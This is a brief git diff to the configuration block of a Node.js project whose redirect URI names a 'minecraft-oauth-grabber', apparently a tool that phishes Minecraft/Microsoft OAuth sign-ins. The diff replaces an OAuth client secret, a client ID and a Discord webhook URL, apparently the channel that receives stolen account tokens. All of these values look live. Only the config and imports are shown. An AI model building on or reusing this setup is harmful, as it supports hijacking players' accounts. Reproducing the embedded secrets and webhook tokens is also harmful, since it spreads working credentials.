@@ -1,8 +1,8 @@
 //Config
-const secret_value = 'MXR8Q~Id45ZFAupwk36eAt.e4PdtkzEfJvNmWbuC'
-const client_id = 'dfd4dbcd-875c-46de-bfb5-26cc511f589a'
+const secret_value = 'KJR8Q~g05PSkc-G_eIyt9QGN4EAgKLvW4ehV2apf'
+const client_id = '95a3a604-ad37-4af9-b41d-c5d05a12459e'
 const redirect_uri = 'https://minecraft-oauth-grabber-mog-production.up.railway.app/'
-const webhook_url = 'https://discord.com/api/webhooks/1052357651419369472/9jDUbb3oX0gi3o2XmvhnmHKGXhsP-cd2Y_uoYz280ULusdnQ2JolvtvE1ncvZgkjvMM8'
+const webhook_url = 'https://discord.com/api/webhooks/1052987188800929892/G1LDrmac1yE9oodyL6R8JnScAifzyqfPDbedoOAjSkdz8IWJ1_4ydcnAtJgtCKp79wfT'
 //Requirements
 const axios = require('axios')
 const express = require('express')
